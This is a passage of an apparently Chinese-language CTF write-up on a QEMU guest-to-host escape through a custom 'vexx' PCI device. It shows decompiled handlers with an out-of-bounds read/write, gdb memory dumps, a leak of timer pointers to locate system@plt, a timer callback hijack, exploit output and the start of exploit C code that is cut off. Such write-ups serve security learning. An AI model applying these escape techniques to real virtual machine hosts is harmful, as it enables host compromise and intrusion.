class="keyword">uint32_t</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">bool</span> v5; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int64_t</span> v8; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (addr &gt; <span class="number">0x7F</span> || size == <span class="number">4</span>) &amp;&amp; (((size - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFB</span>) == <span class="number">0</span> || addr &lt;= <span class="number">0x7F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = val;</span><br><span class="line">    <span class="keyword">if</span> ( addr == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = ~(_DWORD)val;</span><br><span class="line">      v5 = (v7 &amp; opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">      opaque-&gt;irq_status &amp;= v7;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &amp;&amp; !msi_enabled(&amp;opaque-&gt;pdev) )</span><br><span class="line">        pci_set_irq(&amp;opaque-&gt;pdev, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x64</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (opaque-&gt;status &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          qemu_mutex_lock_func(&amp;opaque-&gt;thr_mutex, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">271</span>);</span><br><span class="line">          opaque-&gt;fact = v4;</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)&amp;opaque-&gt;status, <span class="number">1u</span>);</span><br><span class="line">          qemu_cond_signal(&amp;opaque-&gt;thr_cond);  <span class="comment">// 给线程发送信号</span></span><br><span class="line">          qemu_mutex_unlock_impl(&amp;opaque-&gt;thr_mutex, <span class="string">"/home/giglf/workbench/learn/qemu-4.0.0/hw/misc/vexx.c"</span>, <span class="number">275</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">          opaque-&gt;addr4 = ~(_DWORD)val;         <span class="comment">// 设置addr4</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">32</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = &amp;opaque-&gt;status;</span><br><span class="line">        <span class="keyword">if</span> ( (val &amp; <span class="number">0x80</span>) != <span class="number">0</span> )</span><br><span class="line">          _InterlockedOr((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)v6, <span class="number">0x80</span>u);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          _InterlockedAnd((<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)v6, <span class="number">0xFFFFFF7F</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">96</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)val | opaque-&gt;irq_status) == <span class="number">0</span>;</span><br><span class="line">        opaque-&gt;irq_status |= val;</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">          vexx_raise_irq(opaque, <span class="number">0x60</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">136</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;vexxdma.dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;vexxdma.dma.dst = val;          <span class="comment">// 设置dma.dst</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr &lt;= <span class="number">0x88</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">128</span> &amp;&amp; (opaque-&gt;vexxdma.dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;vexxdma.dma.src = val;          <span class="comment">// 设置dma.src</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">144</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;vexxdma.dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">        opaque-&gt;vexxdma.dma.cnt = val;          <span class="comment">// 设置dma.cnt</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( addr == <span class="number">152</span> &amp;&amp; (val &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; (opaque-&gt;vexxdma.dma.cmd &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      opaque-&gt;vexxdma.dma.cmd = val;            <span class="comment">// 设置dma.cmd</span></span><br><span class="line">      v8 = qemu_clock_get_ns(QEMU_CLOCK_VIRTUAL);</span><br><span class="line">      timer_mod(&amp;opaque-&gt;vexxdma.dma_timer, v8 / <span class="number">1000000</span> + <span class="number">100</span>);<span class="comment">// 启动timer</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>mmio_write就是设置相关dma信息，同时可以启动timer，以及给thread发信号</p>
<p>后来又看了其他函数，才发现都没有关系，漏洞点在cmb_write和cmb_read处</p>
<p><strong>vexx_cmb_write</strong></p>
<p>这里用到新的对象</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> VexxRequest     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x108</span>, align=<span class="number">0x4</span>, copyof_4574)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: VexxState/r</span><br><span class="line"><span class="number">00000000</span> state           dd ?</span><br><span class="line"><span class="number">00000004</span> offset          dd ?</span><br><span class="line"><span class="number">00000008</span> req_buf         db <span class="number">256</span> dup(?)</span><br><span class="line"><span class="number">00000108</span> VexxRequest     ends</span><br></pre></td></tr></table></figure>
<p>buf是0x100大小</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_cmb_write</span><span class="params">(VexxState *opaque, hwaddr addr, <span class="keyword">uint64_t</span> val, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v4; <span class="comment">// eax</span></span><br><span class="line">  hwaddr v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v4 = opaque-&gt;memorymode;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x100</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    LODWORD(addr) = opaque-&gt;req.offset + addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v4 &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x100</span> )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = addr - <span class="number">0x100</span>;</span><br><span class="line">  LODWORD(addr) = addr - <span class="number">0x100</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">0x50</span> )</span><br><span class="line">LABEL_4:</span><br><span class="line">    *(_QWORD *)&amp;opaque-&gt;req.req_buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr] = val;<span class="comment">// 越界写</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个offset虽然找不到哪里设置的，但是以0为假设，这里v5 = 0x50也超了0x100的缓冲区了</p>
<p><strong>vexx_cmb_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> __<span class="function">fastcall <span class="title">vexx_cmb_read</span><span class="params">(VexxState *opaque, hwaddr addr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;memorymode;</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">255L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x100</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    LODWORD(addr) = opaque-&gt;req.offset + addr;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (v3 &amp; <span class="number">2</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">255L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( addr &gt; <span class="number">0x100</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">  &#125;</span><br><span class="line">  result = <span class="number">255L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( addr - <span class="number">256</span> &lt;= <span class="number">0x50</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(addr) = addr - <span class="number">256</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">    result = *(_QWORD *)&amp;opaque-&gt;req.req_buf[(<span class="keyword">unsigned</span> <span class="keyword">int</span>)addr]; <span class="comment">//跟write同理的越界读</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>越界读写都能访问到dma结构体，里面能劫持控制流的就dma_buf</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> VexxDma         struc ; (<span class="keyword">sizeof</span>=<span class="number">0x1060</span>, align=<span class="number">0x8</span>, copyof_4573)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: VexxState/r</span><br><span class="line"><span class="number">00000000</span> state           dd ?</span><br><span class="line"><span class="number">00000004</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000005</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000006</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000007</span>                 db ? ; undefined</span><br><span class="line"><span class="number">00000008</span> dma             dma_state ?</span><br><span class="line"><span class="number">00000028</span> dma_timer       QEMUTimer_0 ?</span><br><span class="line"><span class="number">00000058</span> dma_buf         db <span class="number">4096</span> dup(?)</span><br><span class="line"><span class="number">00001058</span> dma_mask        dq ?</span><br><span class="line"><span class="number">00001060</span> VexxDma         ends</span><br></pre></td></tr></table></figure>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先看看dma_buf能泄露出什么有用的信息(先写个poc让程序断到cmb_write上)</p>
<p>PS:gdb启动的越来越慢了</p>
<p>这里由于vexx有两个mmio，所以在映射的时候需要分别使用resource0和resource1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_mmio</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span>(mmio_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        Err(<span class="string">"Open pci"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_mem&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        Err(<span class="string">"mmap mmio_mem"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_cmb</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fdcmb = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource1"</span>, O_RDWR|O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (fdcmb &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        Err(<span class="string">"fdcmb open"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    cmb_mem = mmap(<span class="literal">NULL</span>, <span class="number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fdcmb, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmb_mem == MAP_FAILED) &#123;</span><br><span class="line">        Err(<span class="string">"cmb"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>VexxDma里面的timer，可以泄露出vexx_dma_timer的地址，进而得到程序基址，以及system_plt / sh_str，如果不打/bin/sh(因为这题先前做的，后来才知道是打不了sh的)，这里也可以通过泄露VexxState的地址，来得到reqbuf，在里面写上cat flag，再通过system调用</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /20gx 0x5555574f51e0 + 0xC90</span><br><span class="line">0x5555574f5e70:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555574f5e80:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555574f5e90:	0x0000000000000000	0xffffffffffffffff</span><br><span class="line">0x5555574f5ea0:	0x0000555556662500	0x0000555555a30f10</span><br><span class="line">0x5555574f5eb0:	0x00005555574f51e0	0x0000000000000000</span><br><span class="line">0x5555574f5ec0:	0x000f424000000000	0x0000000000000000</span><br><span class="line">0x5555574f5ed0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555574f5ee0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555574f5ef0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5555574f5f00:	0x0000000000000000	0x0000000000000000</span><br><span class="line">gdb-peda$ p &#123;struct QEMUTimer&#125; 0x5555574f5e98</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  expire_time = 0xffffffffffffffff, </span><br><span class="line">  timer_list = 0x555556662500, </span><br><span class="line">  cb = 0x555555a30f10 &lt;vexx_dma_timer&gt;, </span><br><span class="line">  opaque = 0x5555574f51e0, </span><br><span class="line">  next = 0x0, </span><br><span class="line">  attributes = 0x0, </span><br><span class="line">  scale = 0xf4240</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>QEMUTimer_0结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> QEMUTimer_0     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x30</span>, align=<span class="number">0x8</span>, copyof_1100)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: VexxDma/r</span><br><span class="line"><span class="number">00000000</span> expire_time     dq ?</span><br><span class="line"><span class="number">00000008</span> timer_list      dq ?                    ; offset</span><br><span class="line"><span class="number">00000010</span> cb              dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> opaque          dq ?                    ; offset</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> attributes      dd ?</span><br><span class="line"><span class="number">0000002</span>C scale           dd ?</span><br><span class="line"><span class="number">00000030</span> QEMUTimer_0     ends</span><br></pre></td></tr></table></figure>
<p>不过实际调试发现，memorymode默认是4(instance_init中设置的)，所以需要想办法改成1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_instance_init</span><span class="params">(VexxState *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  VexxState *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v1-&gt;memorymode = <span class="number">4</span>;                           <span class="comment">// memory_mode初始化为4</span></span><br><span class="line">  v1-&gt;req.offset = <span class="number">0</span>;                           <span class="comment">// offset初始化为0</span></span><br><span class="line">  v1-&gt;vexxdma.dma_mask = <span class="number">0xFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析程序可以得到设置的地方在ioport_write(这种另类的ioport_write回头要再看一下)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">vexx_ioport_write</span><span class="params">(VexxState *opaque, <span class="keyword">uint32_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( addr - <span class="number">560</span> &lt;= <span class="number">0x20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x240</span>u:</span><br><span class="line">        opaque-&gt;req.offset = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x250</span>u:</span><br><span class="line">        opaque-&gt;req.state = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x230</span>u:</span><br><span class="line">        opaque-&gt;memorymode = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进行io_port操作之前需要进行这一步操作(这个也是看exp得到的，需要后续研究)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">res = ioperm(<span class="number">0x230</span>, <span class="number">0x30</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    Err(<span class="string">"ioperm"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而且这里很奇怪，只能用outb，我一开始用outl就是错误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_offset</span><span class="params">(<span class="keyword">uint64_t</span> val)</span></span>&#123;</span><br><span class="line">    outb(val, <span class="number">0x240</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_mode</span><span class="params">(<span class="keyword">uint64_t</span> val)</span></span>&#123;</span><br><span class="line">    outb(val, <span class="number">0x230</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>写入完成后，直接通过dma触发timer即可</p>
<p>最终可以触发到sh，但是好像一样出现这个提示(不能打sh)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># ./<span class="built_in">exp</span></span><br><span class="line">leaking timer_addr: <span class="number">0x5643b3662f10</span></span><br><span class="line">leaking rebase: <span class="number">0x5643b3186000</span></span><br><span class="line">leaking system_plt_addr: <span class="number">0x5643b3431860</span></span><br><span class="line">leaking sh_str: <span class="number">0x5643b39ae71c</span></span><br><span class="line"># $ sh: turning off NDELAY mode</span><br></pre></td></tr></table></figure>
<p>完整exp如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* cmb_mem_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* cmb_mem = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cmb_write</span><span class="params">(<span class="keyword">uint32_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(cmb_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 